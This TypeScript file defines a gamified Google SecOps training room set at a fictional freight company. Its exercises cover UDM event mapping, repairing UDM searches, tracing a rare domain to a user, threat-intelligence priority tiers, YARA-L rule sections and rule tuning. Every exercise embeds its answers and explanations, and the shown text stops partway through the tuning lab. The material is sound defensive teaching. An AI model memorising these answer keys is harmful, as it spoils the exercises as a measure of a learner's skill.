import type { RoomExperience } from "./types";

// "Operation Long Memory" for the "google-secops-fundamentals" room.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Kestrel Freight (fictional). Signature mechanics: the data pathway (a log's journey), the
// spot-the-broken-query diff, the rule-tuning dials and the SOAR case queue. UDM Search and
// YARA-L are not supported by the hunt lab (KQL, SPL, EQL only), so they are taught through
// anatomy, spotdiff, worksheet, sort, codebreak, tune and sequence labs.
// Game mix: pathway + spotdiff + rush + codebreak + tune.
// Lab data differs from the graded tasks: the anatomy is a 7-Zip launch on kf-dp-0112 and the
// worksheet is a login table, never the encoded PowerShell chain on kf-ws-0188 (q1, la1) or the
// lookalike-domain table on kf-ws-0274 (f1); the trace follows kf-lt-0455 and bulk-mailer-track.example, never
// kf-lt-0612 or the LedgerWorks IP (ac1, ac2); the tune dials use a 6-failure, 30-minute rule,
// never the 5-failure, 15-minute rule assembled in o1; the queue works case 6120 on kf-lt-0319,
// never case 6130, and the sequence is a sign-in case, never the document-launched PowerShell case.
//
// Separation (graded task: the lab line that teaches its idea):
//  m1: r2 anatomy (principal = actor, target = acted on, event 1 vs event 3 and 22) + primer.
//  q1: r3 spotdiff + primer (quotes, regex, nocase, enumerated fields) and r2 anatomy (target.process
//      is the launched process).
//  f1: r3 worksheet (filter, count distinct, narrow by a condition).
//  ac1: r4 trace (rare domain to process to user) and the ATI priority sort.
//  ac2: r4 priority sort and the rush lab (shared addresses, prevalence limits).
//  o1: r5 codebreak primer (section order) and tune (threshold and window).
//  q2: r5 tool sort and primer (a retrohunt follows the rule's alerting setting).
//  q3: the precise or broad sort.
//  la1: the launch-record inspect lab and the r2 anatomy.
//  o2: the sign-in sequence and the r6 queue (verify, contain only when sure, document last).

export const GOOGLE_SECOPS_FUNDAMENTALS: RoomExperience = {
  "roomId": "google-secops-fundamentals",
  "codename": "Operation Long Memory",
  "theme": "ingest",
  "handler": {
    "name": "Priya Raman",
    "role": "Detection Engineer, Kestrel Freight"
  },
  "briefing": [
    "Kestrel Freight. 14 depots, 2,400 people, and trucks that cannot wait for an IT ticket.",
    "Last quarter the company moved its SIEM to Google Security Operations. Every log from every depot now lands in one place, in one schema.",
    "Priya Raman built the first detections. The data is all there. She needs analysts who can read it, search it and run a case from it.",
    "Learn the platform, read a UDM event, write the searches, judge entities and intel, understand a YARA-L rule, then run a case in SOAR."
  ],
  "mission": "Follow a log through the platform, map raw fields to UDM, repair broken searches, trace a rare domain to a user, tune and assemble a YARA-L rule, then work case 6130 from first alert to closure.",
  "estimate": "~55 min",
  "look": {
    "primary": "#60a5fa",
    "secondary": "#34d399",
    "warn": "#fb7185"
  },
  "scene": "intake",
  "layout": "stage",
  "stations": [
    {
      "id": "platform",
      "label": "Platform Map",
      "topic": "SIEM, SOAR, threat intelligence and Gemini · why teams migrate · a log's journey",
      "tagline": "Four jobs, one console",
      "building": "control",
      "taskIds": [
        "gso-r1"
      ]
    },
    {
      "id": "udm",
      "label": "Raw Log to UDM",
      "topic": "Parsers · UDM structures · event types · principal and target · Sysmon mapping",
      "tagline": "One schema for every source",
      "building": "factory",
      "taskIds": [
        "gso-r2",
        "gso-m1"
      ]
    },
    {
      "id": "search",
      "label": "UDM Search",
      "topic": "Query syntax · value types · regex and nocase · repeated fields · reading results",
      "tagline": "Ask the data a precise question",
      "building": "archive",
      "taskIds": [
        "gso-r3",
        "gso-q1",
        "gso-f1"
      ]
    },
    {
      "id": "intel",
      "label": "Entities and Intel",
      "topic": "Asset view · prevalence · insights · IOC matches · ATI priority · shared infrastructure",
      "tagline": "Rare is a lead, not a verdict",
      "building": "office",
      "taskIds": [
        "gso-r4",
        "gso-ac1",
        "gso-ac2"
      ]
    },
    {
      "id": "detect",
      "label": "YARA-L Detections",
      "topic": "Rule sections · windows · conditions · retrohunt · curated precise and broad rules",
      "tagline": "Rules that watch while you sleep",
      "building": "lab",
      "taskIds": [
        "gso-r5",
        "gso-o1",
        "gso-q2",
        "gso-q3"
      ]
    },
    {
      "id": "boss",
      "label": "Case 6130",
      "topic": "SOAR cases · Case Wall · playbooks · reading the incident chain · order of work",
      "tagline": "From first alert to closed case",
      "building": "ticket",
      "taskIds": [
        "gso-r6",
        "gso-la1",
        "gso-o2"
      ],
      "boss": true
    }
  ],
  "personas": {
    "gso-m1": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "The Sysmon parser is the one I trust least to remember. Show me you know where each field lands."
    },
    "gso-q1": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "I need that search to read only the launched process. Which one is it?"
    },
    "gso-f1": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "Ten rows, and not every one is a lookalike. Count carefully."
    },
    "gso-ac1": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "Asset view flagged one domain on a Procurement laptop. Your verdict."
    },
    "gso-ac2": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "Finance is on the phone about an alert on their workstation."
    },
    "gso-o1": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "I have the pieces of the rule on sticky notes. Put them in order."
    },
    "gso-q2": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "New rule, alerting on, and I would like to see its history first."
    },
    "gso-q3": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "The curated rule set is noisy this week. Where do I turn the dial?"
    },
    "gso-la1": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "First alert in case 6130. Read the event, not the title."
    },
    "gso-o2": {
      "name": "Priya Raman",
      "role": "Detection Engineer",
      "line": "Case 6130 is confirmed. Put the playbook steps in the right order."
    }
  },
  "briefings": {
    "gso-r1": [
      {
        "kind": "sort",
        "title": "Which Part Does the Job?",
        "prompt": "Eight tasks from a day at Kestrel Freight. Drop each one on the part of Google SecOps that does it.",
        "buckets": [
          {
            "id": "siem",
            "label": "SIEM"
          },
          {
            "id": "soar",
            "label": "SOAR"
          },
          {
            "id": "ti",
            "label": "Threat intelligence"
          },
          {
            "id": "gem",
            "label": "Gemini"
          }
        ],
        "items": [
          {
            "id": "i1",
            "text": "Turn a Cisco firewall log and a Linux auth log into the same named fields",
            "bucket": "siem",
            "why": "Parsers write UDM events, the single schema that all searches and rules read. That is the SIEM side."
          },
          {
            "id": "i2",
            "text": "Run a YARA-L rule that matches events across a 30-minute window",
            "bucket": "siem",
            "why": "Detection rules run on UDM events in the SIEM. A match becomes a detection and an alert."
          },
          {
            "id": "i3",
            "text": "Group three alerts about one depot laptop into a single case with a Case Wall",
            "bucket": "soar",
            "why": "Cases and the Case Wall are SOAR. Alerts are grouped by shared entities and configurable rules."
          },
          {
            "id": "i4",
            "text": "Run enrichment and ask for approval to isolate a host without an analyst clicking each step",
            "bucket": "soar",
            "why": "Playbooks (trigger, actions, flows) are the SOAR automation layer."
          },
          {
            "id": "i5",
            "text": "Show that a domain in your DNS logs is a Mandiant-curated indicator",
            "bucket": "ti",
            "why": "Applied Threat Intelligence compares your UDM events with Mandiant-curated IOCs and lists the results on the IOC matches page."
          },
          {
            "id": "i6",
            "text": "Prioritize an IOC match as Active Breach rather than Medium",
            "bucket": "ti",
            "why": "Priority is part of Applied Threat Intelligence: it says how strongly Google ties the indicator to real compromises."
          },
          {
            "id": "i7",
            "text": "Turn \"show me failed logins from new countries this week\" into a UDM query",
            "bucket": "gem",
            "why": "Gemini can generate a UDM search from an English prompt. You still read the query before trusting it."
          },
          {
            "id": "i8",
            "text": "Summarize the results after a search has finished",
            "bucket": "gem",
            "why": "Gemini can summarize search results. It describes what is there; deciding what it means is still the analyst's job."
          }
        ]
      },
      {
        "kind": "pathway",
        "title": "Follow One Log to a Closed Case",
        "prompt": "A depot laptop writes a Sysmon event. Walk it through the platform one hop at a time until a playbook has something to enrich. Detours cost a life.",
        "goal": "Reach the playbook",
        "nodes": [
          {
            "id": "n1",
            "label": "Laptop",
            "sub": "Sysmon event",
            "x": 9,
            "y": 50
          },
          {
            "id": "n2",
            "label": "Feed",
            "sub": "tags a log type",
            "x": 22,
            "y": 28
          },
          {
            "id": "n3",
            "label": "Parser",
            "sub": "per log type",
            "x": 36,
            "y": 52
          },
          {
            "id": "n4",
            "label": "UDM event",
            "sub": "named slots",
            "x": 50,
            "y": 28
          },
          {
            "id": "n5",
            "label": "YARA-L rule",
            "sub": "reads UDM",
            "x": 64,
            "y": 52
          },
          {
            "id": "n6",
            "label": "Detection",
            "sub": "alert raised",
            "x": 78,
            "y": 28
          },
          {
            "id": "n7",
            "label": "SOAR case",
            "sub": "grouped alerts",
            "x": 88,
            "y": 56
          },
          {
            "id": "n8",
            "label": "Playbook",
            "sub": "enrich, act",
            "x": 78,
            "y": 86
          },
          {
            "id": "d1",
            "label": "Raw log search",
            "sub": "unparsed text",
            "x": 24,
            "y": 80
          },
          {
            "id": "d2",
            "label": "Dashboard",
            "sub": "charts",
            "x": 50,
            "y": 82
          },
          {
            "id": "d3",
            "label": "Reference list",
            "sub": "lookup values",
            "x": 64,
            "y": 84
          }
        ],
        "edges": [
          [
            "n1",
            "n2"
          ],
          [
            "n2",
            "n3"
          ],
          [
            "n3",
            "n4"
          ],
          [
            "n4",
            "n5"
          ],
          [
            "n5",
            "n6"
          ],
          [
            "n6",
            "n7"
          ],
          [
            "n7",
            "n8"
          ],
          [
            "n2",
            "d1"
          ],
          [
            "n4",
            "d2"
          ],
          [
            "n5",
            "d3"
          ]
        ],
        "route": [
          "n1",
          "n2",
          "n3",
          "n4",
          "n5",
          "n6",
          "n7",
          "n8"
        ],
        "notes": {
          "n1": "The laptop writes a raw Sysmon event.",
          "n2": "A feed or forwarder delivers it to SecOps tagged with its log type.",
          "n3": "The parser for that log type extracts the fields.",
          "n4": "The parser writes a UDM event. Rules and searches read this, not the raw text.",
          "n5": "A YARA-L rule evaluates UDM events.",
          "n6": "A match becomes a detection, and an alert is raised.",
          "n7": "SOAR groups alerts that share entities into one case.",
          "n8": "A playbook attaches to the case or alert: it can enrich entities and take actions."
        },
        "traps": {
          "d1": "Raw log search reads the original text before parsing. The rule engine does not run on that text, so the journey continues through the parser.",
          "d2": "A dashboard summarizes UDM data for people to look at. It does not raise alerts or open cases.",
          "d3": "A reference list holds values a rule can compare against. It is an input to a rule, not the next stage of the log's journey."
        },
        "lesson": "A raw event only becomes searchable and detectable once a parser writes it as UDM. Everything after that, rules, detections, cases and playbooks, works on UDM events and entities, not on the original text."
      }
    ],
    "gso-r2": [
      {
        "kind": "anatomy",
        "title": "Anatomy of a PROCESS_LAUNCH Event",
        "prompt": "A depot dispatcher unpacks a file. Read the UDM event field by field before you map raw fields yourself.",
        "source": "Google SecOps · UDM event · PROCESS_LAUNCH · kf-dp-0112",
        "fields": [
          {
            "key": "metadata.event_timestamp",
            "value": "2026-11-02T14:03:18Z",
            "label": "When"
          },
          {
            "key": "metadata.event_type",
            "value": "PROCESS_LAUNCH",
            "label": "Kind of event",
            "note": "The event type decides which other fields must exist. A launch needs a machine in principal and the new process in target.process."
          },
          {
            "key": "metadata.product_event_type",
            "value": "1",
            "label": "Source's own ID",
            "note": "For Sysmon the EventID is kept here. 1 is process creation."
          },
          {
            "key": "principal.hostname",
            "value": "kf-dp-0112",
            "label": "Where",
            "note": "Endpoint events carry at least one machine identifier in principal."
          },
          {
            "key": "principal.user.userid",
            "value": "t.abara",
            "label": "Who"
          },
          {
            "key": "principal.process.file.full_path",
            "value": "C:\\Windows\\explorer.exe",
            "label": "The parent",
            "note": "The actor. principal.process is the process that did the launching."
          },
          {
            "key": "principal.process.command_line",
            "value": "C:\\Windows\\Explorer.EXE",
            "label": "Parent's command line"
          },
          {
            "key": "target.process.file.full_path",
            "value": "C:\\Program Files\\7-Zip\\7z.exe",
            "label": "The launched process",
            "note": "target.process is the new process. A search for 'what ran' reads here."
          },
          {
            "key": "target.process.command_line",
            "value": "\"C:\\Program Files\\7-Zip\\7z.exe\" x D:\\inbound\\manifest.zip",
            "label": "What it was told to do"
          },
          {
            "key": "target.process.pid",
            "value": "9120",
            "label": "New process ID"
          }
        ],
        "summary": "Principal is the actor and target is what it acted on: here the parent starts a new process, so the parent sits in principal and the new process in target. The same raw field name can land somewhere else on another event. On a Sysmon network connection (event 3) or DNS query (event 22) the process that made the call is the actor, so its Image goes to principal.process.file.full_path. Read the event type first, then the nouns.",
        "primer": {
          "title": "How the Sysmon parser fills UDM",
          "points": [
            "Sysmon event 1 (process creation) becomes PROCESS_LAUNCH. The new process goes in target.process, its parent in principal.process.",
            "Sysmon event 3 (network connection) becomes NETWORK_CONNECTION. The process that connected goes in principal.process, the far end in target.ip and target.port.",
            "Sysmon event 22 (DNS query) becomes NETWORK_DNS. The queried name lands in network.dns.questions.name.",
            "The account that ran the process goes in principal.user.userid."
          ],
          "example": {
            "label": "Event 3 on a different host",
            "lines": [
              "Raw: Image = C:\\Tools\\sync.exe   DestinationIp = 192.0.2.9   DestinationPort = 8443",
              "UDM: principal.process.file.full_path = C:\\Tools\\sync.exe",
              "UDM: target.ip = 192.0.2.9   target.port = 8443",
              "UDM: metadata.event_type = NETWORK_CONNECTION"
            ]
          }
        }
      },
      {
        "kind": "sort",
        "title": "Principal, Target or Something Else?",
        "prompt": "Priya's team is adding sources. For each piece of an event, decide which UDM noun carries it.",
        "buckets": [
          {
            "id": "principal",
            "label": "principal"
          },
          {
            "id": "target",
            "label": "target"
          },
          {
            "id": "intermediary",
            "label": "intermediary"
          },
          {
            "id": "observer",
            "label": "observer"
          },
          {
            "id": "about",
            "label": "about"
          }
        ],
        "items": [
          {
            "id": "k1",
            "text": "The workstation that sent a web request",
            "bucket": "principal",
            "why": "principal is the acting entity that originates the activity."
          },
          {
            "id": "k2",
            "text": "The web server that received the request",
            "bucket": "target",
            "why": "target is the entity being referenced or acted on: a connection's destination."
          },
          {
            "id": "k3",
            "text": "The forward proxy that relayed the request",
            "bucket": "intermediary",
            "why": "intermediary holds systems the activity passes through, such as proxies and mail relays."
          },
          {
            "id": "k4",
            "text": "A network sensor that only copied the traffic and reported on it",
            "bucket": "observer",
            "why": "observer is a device that watches and reports without being in the path, such as a packet sniffer."
          },
          {
            "id": "k5",
            "text": "A DLL loaded while a process launches",
            "bucket": "about",
            "why": "about holds entities the event mentions that are not principal, src or target, such as a loaded DLL or an email attachment."
          },
          {
            "id": "k6",
            "text": "The account typing at a server's own keyboard during a local logon",
            "bucket": "target",
            "why": "USER_LOGIN puts the user being logged on in target.user. Principal is set only for remote activity."
          },
          {
            "id": "k7",
            "text": "A vulnerability scanner reporting an open port on a host",
            "bucket": "observer",
            "why": "A scanner reports on the host without being the actor or in the path, so it is an observer."
          },
          {
            "id": "k8",
            "text": "The mail relay an email passed through on its way to a mailbox",
            "bucket": "intermediary",
            "why": "A relay processes the activity on the way: that is the intermediary role."
          },
          {
            "id": "k9",
            "text": "The parent process that starts a new process",
            "bucket": "principal",
            "why": "On a launch the parent is the actor, so it sits in principal.process. The new process is in target.process."
          }
        ]
      }
    ],
    "gso-r3": [
      {
        "kind": "spotdiff",
        "title": "Repair the Saved Search",
        "prompt": "Priya's saved search finds large uploads from one laptop. A teammate edited it and now it fails. Tap the lines that break it. Harmless style differences are decoys.",
        "goodTitle": "Priya's saved search",
        "suspectTitle": "Teammate's edited copy",
        "good": [
          "metadata.event_type = \"NETWORK_HTTP\"",
          "AND network.http.method = \"POST\"",
          "AND principal.hostname = \"kf-ws-0315\" nocase",
          "AND network.sent_bytes > 50000000",
          "AND metadata.ingested_timestamp.seconds > 1793696400",
          "AND target.hostname = /transfer|upload|drop/ nocase"
        ],
        "suspect": [
          "metadata.event_type = \"NETWORK_HTTP\"",
          "and network.http.method = \"POST\"",
          "AND principal.hostname = kf-ws-0315 nocase",
          "AND network.sent_bytes > \"50000000\"",
          "AND metadata.ingested_timestamp > \"2026-11-03T09:00:00Z\"",
          "AND target.hostname = /transfer|upload|drop/ NOCASE"
        ],
        "diffs": [
          {
            "line": 2,
            "why": "A string value needs double quotes: principal.hostname = \"kf-ws-0315\"."
          },
          {
            "line": 3,
            "why": "Numbers are written without quotes. With quotes the value is a string, not a number to compare."
          },
          {
            "line": 4,
            "why": "Timestamps are searched with the epoch .seconds part. An ISO date string is not valid for a timestamp field."
          }
        ],
        "decoys": [
          {
            "line": 1,
            "why": "Harmless: and and AND both work, and AND is assumed if you leave the operator out."
          },
          {
            "line": 5,
            "why": "Harmless: NOCASE and nocase are the same modifier."
          }
        ],
        "lesson": "A UDM condition is field operator value. Strings and enumerated values take double quotes, numbers and booleans do not, timestamps use epoch seconds, regex goes between slashes, and nocase can be written in either case.",
        "hud": "Tap the lines that would error or change the result",
        "sameLine": "That line matches the saved search.",
        "winTitle": "Search repaired",
        "primer": {
          "title": "UDM Search conditions",
          "points": [
            "A condition is field operator value, joined with AND, OR and NOT. Parentheses group them.",
            "Strings and enumerated values such as event types take double quotes. Numbers and booleans do not.",
            "A regex goes between slashes and matches anywhere in the value. nocase after a value ignores capitalization.",
            "A plain = with a string must equal the whole value, so use a regex to match part of it.",
            "An enumerated field such as metadata.event_type takes an exact value. To match several, write each with OR inside parentheses.",
            "Timestamp fields are searched by epoch seconds, for example metadata.ingested_timestamp.seconds."
          ],
          "example": {
            "label": "A correct query on other data",
            "lines": [
              "metadata.event_type = \"USER_LOGIN\"",
              "AND target.user.userid = \"R.IBARRA\" nocase",
              "AND (principal.ip = \"203.0.113.77\" OR principal.ip = \"203.0.113.78\")"
            ]
          }
        }
      },
      {
        "kind": "worksheet",
        "title": "Read a Result Table",
        "prompt": "A search for failed and successful logins returned these rows. Work the table the way you would work a results page.",
        "caption": "metadata.event_type = \"USER_LOGIN\" · rows returned by the search",
        "columns": [
          "time (UTC)",
          "target.user.userid",
          "principal.ip",
          "security_result.action"
        ],
        "rows": [
          [
            "11:02:10",
            "t.nguyen",
            "203.0.113.19",
            "FAIL"
          ],
          [
            "11:02:14",
            "t.nguyen",
            "203.0.113.19",
            "FAIL"
          ],
          [
            "11:02:21",
            "r.ibarra",
            "203.0.113.19",
            "FAIL"
          ],
          [
            "11:02:30",
            "t.nguyen",
            "203.0.113.19",
            "FAIL"
          ],
          [
            "11:03:02",
            "p.kaur",
            "198.51.100.8",
            "FAIL"
          ],
          [
            "11:03:40",
            "r.ibarra",
            "203.0.113.19",
            "FAIL"
          ],
          [
            "11:04:12",
            "t.nguyen",
            "203.0.113.19",
            "ALLOW"
          ],
          [
            "11:05:55",
            "p.kaur",
            "198.51.100.8",
            "ALLOW"
          ]
        ],
        "questions": [
          {
            "id": "w1",
            "q": "How many FAIL rows are there for t.nguyen?",
            "hint": "Filter on the user, then on the action.",
            "answer": [
              "3",
              "three"
            ],
            "why": "t.nguyen has FAIL rows at 11:02:10, 11:02:14 and 11:02:30. The 11:04:12 row is ALLOW."
          },
          {
            "id": "w2",
            "q": "How many distinct principal.ip values appear among the FAIL rows?",
            "hint": "Ignore the ALLOW rows, then count different addresses.",
            "answer": [
              "2",
              "two"
            ],
            "why": "The FAIL rows use only 203.0.113.19 and 198.51.100.8."
          },
          {
            "id": "w3",
            "q": "If you added AND security_result.action = \"ALLOW\" to the query, how many rows would remain?",
            "hint": "Count only the ALLOW rows.",
            "answer": [
              "2",
              "two"
            ],
            "why": "Only the 11:04:12 and 11:05:55 rows are ALLOW. A condition narrows the result to the rows that meet every part."
          }
        ]
      }
    ],
    "gso-r4": [
      {
        "kind": "trace",
        "title": "From a Rare Domain to a User",
        "prompt": "Asset view for kf-lt-0455 shows a low prevalence insight. Follow it across three views to the person at the keyboard.",
        "lead": "Asset view · kf-lt-0455 · last 2 hours",
        "steps": [
          {
            "id": "tr1",
            "ask": "Which domain in the Domains sidebar deserves a closer look?",
            "source": "Asset view · Domains sidebar",
            "columns": [
              "Domain",
              "First lookup",
              "Prevalence (assets, 7 days)",
              "Insight"
            ],
            "rows": [
              [
                "office-cdn.example",
                "08:01",
                "412",
                "none"
              ],
              [
                "bulk-mailer-track.example",
                "09:12",
                "1",
                "Low prevalence, newly registered"
              ],
              [
                "kestrelfreight.example",
                "08:00",
                "388",
                "none"
              ],
              [
                "fonts-delivery.example",
                "08:30",
                "97",
                "none"
              ]
            ],
            "answer": 1,
            "why": "A prevalence of one, a newly registered domain and the low prevalence insight all point at the same row. The others are seen by dozens or hundreds of assets.",
            "learned": "bulk-mailer-track.example: 1 asset, newly registered"
          },
          {
            "id": "tr2",
            "ask": "Which process on the host looked that domain up?",
            "source": "UDM Search · NETWORK_DNS · principal.hostname = \"kf-lt-0455\"",
            "columns": [
              "time",
              "principal.process.file.full_path",
              "network.dns.questions.name"
            ],
            "rows": [
              [
                "08:30:11",
                "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                "fonts-delivery.example"
              ],
              [
                "09:11:58",
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "office-cdn.example"
              ],
              [
                "09:12:03",
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "bulk-mailer-track.example"
              ],
              [
                "09:12:40",
                "C:\\Windows\\System32\\svchost.exe",
                "kestrelfreight.example"
              ]
            ],
            "answer": 2,
            "why": "Only the 09:12:03 row asks for that domain, and the process is the browser, so someone followed a link rather than a program calling out on its own.",
            "learned": "Looked up by chrome.exe at 09:12:03, so a link was clicked"
          },
          {
            "id": "tr3",
            "ask": "Who was signed in on that host when it happened?",
            "source": "User view · logins on kf-lt-0455",
            "columns": [
              "time",
              "metadata.event_type",
              "target.user.userid",
              "principal.hostname"
            ],
            "rows": [
              [
                "02:00:04",
                "USER_LOGIN",
                "svc-backup",
                "kf-lt-0455"
              ],
              [
                "07:58:31",
                "USER_LOGIN",
                "f.amaral",
                "kf-lt-0455"
              ],
              [
                "09:40:12",
                "USER_LOGOUT",
                "svc-backup",
                "kf-lt-0455"
              ],
              [
                "07:55:02",
                "USER_LOGIN",
                "adm-kfit",
                "kf-dc-02"
              ]
            ],
            "answer": 1,
            "why": "The interactive login at 07:58 is f.amaral, before the 09:12 lookup and on this host. The 02:00 login is a service account, and the last row is another machine.",
            "learned": "f.amaral was signed in at 07:58 on kf-lt-0455"
          }
        ]
      },
      {
        "kind": "sort",
        "title": "ATI Priority: Which Tier?",
        "prompt": "Applied Threat Intelligence tags each match with a priority. Sort these descriptions into the tier they describe.",
        "buckets": [
          {
            "id": "ab",
            "label": "Active Breach"
          },
          {
            "id": "hi",
            "label": "High"
          },
          {
            "id": "me",
            "label": "Medium"
          }
        ],
        "items": [
          {
            "id": "t1",
            "text": "An indicator Mandiant observed in active or past compromises",
            "bucket": "ab",
            "why": "That is the definition of Active Breach: indicators seen in real incident response work."
          },
          {
            "id": "t2",
            "text": "Seen during a live incident response engagement, Malicious verdict and High severity",
            "bucket": "ab",
            "why": "Active Breach is where Google's verdict is Malicious with High severity and Mandiant has the indicator from active or past compromises."
          },
          {
            "id": "t3",
            "text": "Not seen in Mandiant investigations, but linked by Google Threat Intelligence to threat actors or malware",
            "bucket": "hi",
            "why": "High covers indicators linked to actors or malware even without a Mandiant sighting."
          },
          {
            "id": "t4",
            "text": "Tied to a named malware family, never observed by Mandiant responders",
            "bucket": "hi",
            "why": "A link to malware without a Mandiant sighting is the High tier."
          },
          {
            "id": "t5",
            "text": "Malicious verdict and High severity, but not observed in Mandiant investigations",
            "bucket": "me",
            "why": "Medium is the Malicious verdict plus High severity, even without a Mandiant observation or a tracked-threat link."
          },
          {
            "id": "t6",
            "text": "The tier the documentation suggests starting in non-alerting mode because of its potential volume",
            "bucket": "me",
            "why": "Medium is broad enough that it can flood a queue. Run it non-alerting first, then decide."
          }
        ],
        "primer": {
          "title": "What priority means",
          "points": [
            "Applied Threat Intelligence compares your UDM events with indicators curated by Mandiant.",
            "Priority says how strongly the indicator is tied to real attacks. The three tiers are Active Breach, High and Medium.",
            "Priority is about the indicator. It does not know whether your event is benign. That part is yours."
          ]
        }
      }
    ],
    "gso-ac2": [
      {
        "kind": "rush",
        "title": "Rare or Risky?",
        "prompt": "Fourteen quick calls on what prevalence and IOC matches do and do not tell you. True or false, against the clock.",
        "seconds": 60,
        "target": 9,
        "trueLabel": "True",
        "falseLabel": "False",
        "cards": [
          {
            "id": "c1",
            "text": "A domain queried by exactly one asset is malicious",
            "answer": false,
            "why": "Low prevalence is a lead. A new vendor or supplier site is rare too."
          },
          {
            "id": "c2",
            "text": "An IP indicator can match traffic to shared hosting that also serves legitimate sites",
            "answer": true,
            "why": "Many sites share one address. An IP match inherits the reputation of its worst neighbour."
          },
          {
            "id": "c3",
            "text": "Asset view prevalence counts your own assets that reached a domain in the past seven days",
            "answer": true,
            "why": "That is the definition used in Asset view."
          },
          {
            "id": "c4",
            "text": "If 50 assets reach one address, that alone proves it is safe",
            "answer": false,
            "why": "Wide use lowers suspicion but proves nothing: you still check the process, the host name and the context."
          },
          {
            "id": "c5",
            "text": "The Medium priority tier is suggested to be run in non-alerting mode at first",
            "answer": true,
            "why": "The documentation recommends it because of the potential volume."
          },
          {
            "id": "c6",
            "text": "A program running from a user's AppData folder is proof of malware",
            "answer": false,
            "why": "Plenty of legitimate software installs per user. It is a reason to look closer, not a verdict."
          },
          {
            "id": "c7",
            "text": "The newly registered domain insight uses WHOIS data",
            "answer": true,
            "why": "It flags domains registered within the past 30 days of the search window start."
          },
          {
            "id": "c8",
            "text": "A subdomain can be flagged as low prevalence because its parent domain is rare",
            "answer": true,
            "why": "The insight is computed on the top private domain."
          },
          {
            "id": "c9",
            "text": "Once an IOC matches an IP, the HTTP host name in the event no longer matters",
            "answer": false,
            "why": "The host name tells you which site on that shared address was actually used."
          },
          {
            "id": "c10",
            "text": "A signed vendor's update traffic can never match an indicator",
            "answer": false,
            "why": "Matches are made on addresses and domains, not on who signed the software."
          },
          {
            "id": "c11",
            "text": "Switching off a whole intelligence rule set is the right fix for one noisy vendor address",
            "answer": false,
            "why": "Tune the cause with an exclusion or by keeping the tier non-alerting. Turning it off removes real coverage."
          },
          {
            "id": "c12",
            "text": "The Domain view lists the resolved IPs seen in your organization for a name",
            "answer": true,
            "why": "That is what the Resolved IPs section shows for a fully qualified domain name."
          },
          {
            "id": "c13",
            "text": "In the prevalence graph, large gray circles mark first connections to domains",
            "answer": true,
            "why": "Gray circles are first connections and red triangles mark security alerts."
          },
          {
            "id": "c14",
            "text": "A match with Active Breach priority and an unusual process path deserves the same scrutiny as a Medium match on a vendor update",
            "answer": false,
            "why": "Context decides. The first has strong intelligence and an unusual process, the second is weak and has well-known context."
          }
        ],
        "lesson": "Prevalence and IOC priority are signals, not verdicts. Rare can be new vendors, and a shared address can be a neighbour. Read the process, the host name, the other assets and any approval before you decide.",
        "primer": {
          "title": "Two signals, two limits",
          "points": [
            "Prevalence is how many of your own assets reached a domain in the past seven days. Low means few, not bad.",
            "An IOC match says an indicator is in Mandiant's curated list. It does not say your event is an attack.",
            "A shared address, such as a content delivery network, can serve a bad site and a good one."
          ]
        }
      }
    ],
    "gso-r5": [
      {
        "kind": "codebreak",
        "title": "Crack the Rule Keywords",
        "prompt": "Seven clues about YARA-L, each answer one word. Letter feedback after every try.",
        "tries": 5,
        "rounds": [
          {
            "id": "k1",
            "clue": "The section that holds author, description and severity",
            "answer": "META",
            "why": "meta is descriptive: author, description, severity. It never changes what fires."
          },
          {
            "id": "k2",
            "clue": "The section that declares variables such as $e and filters them with UDM fields",
            "answer": "EVENTS",
            "why": "events declares event variables and the conditions each must meet."
          },
          {
            "id": "k3",
            "clue": "The section that groups events by a variable over a time window",
            "answer": "MATCH",
            "why": "match names the grouping variables and the window, for example $user over 15m."
          },
          {
            "id": "k4",
            "clue": "The section where count() and other calculations are stored in variables",
            "answer": "OUTCOME",
            "why": "outcome calculates values for each detection, such as a count of events."
          },
          {
            "id": "k5",
            "clue": "The section that decides whether a detection fires, such as #fail >= 5",
            "answer": "CONDITION",
            "why": "condition holds the logic that must be true for the rule to fire."
          },
          {
            "id": "k6",
            "clue": "The window made with by instead of over, in non-overlapping blocks",
            "answer": "TUMBLING",
            "why": "by creates tumbling windows. over creates hop windows."
          },
          {
            "id": "k7",
            "clue": "Running a rule over stored history to find threats you missed",
            "answer": "RETROHUNT",
            "why": "A retrohunt applies a rule's logic to historical data."
          }
        ],
        "lesson": "A rule is meta, events, match, outcome and condition in that order. over makes hop windows, by makes tumbling windows, and a retrohunt reads history.",
        "primer": {
          "title": "A rule from top to bottom",
          "points": [
            "A rule needs meta, events and condition. match and outcome are added when the logic needs them.",
            "Sections always appear in the same order: meta, events, match, outcome, condition.",
            "$e style names are event variables. $user style names are placeholder variables that tie events to the same value."
          ],
          "example": {
            "label": "A small rule on other data",
            "lines": [
              "rule kf_service_burst {",
              "  meta: author = \"Kestrel SOC\"  severity = \"LOW\"",
              "  events: $svc.metadata.event_type = \"SERVICE_CREATION\"  $svc.principal.hostname = $host",
              "  match: $host over 1h",
              "  outcome: $installs = count($svc.metadata.id)",
              "  condition: $installs >= 3",
              "}"
            ]
          }
        }
      },
      {
        "kind": "tune",
        "title": "Tune the Window and the Threshold",
        "prompt": "Priya's brute-force rule watches failed logins followed by a success. Set how many failures it needs and how long a window it watches, deploy, and see which accounts it would raise. The failure count is a floor: an episode trips it with that many or more. The window is a ceiling: an episode trips it when the success comes within it.",
        "eventColumn": "user and morning",
        "dials": [
          {
            "id": "fails",
            "label": "Failures before the success (threshold)",
            "short": "failures",
            "min": 1,
            "max": 12,
            "step": 1,
            "start": 1
          },
          {
            "id": "gap",
            "label": "Minutes from first failure to success (window)",
            "short": "window",
            "unit": " min",
            "min": 1,
            "max": 60,
            "step": 1,
            "start": 1,
            "dir": "below"
          }
        ],
        "events": [
          {
            "id": "b1",
            "label": "k.mensah: 8 failures, success after 6 minutes",
            "bad": true,
            "values": {
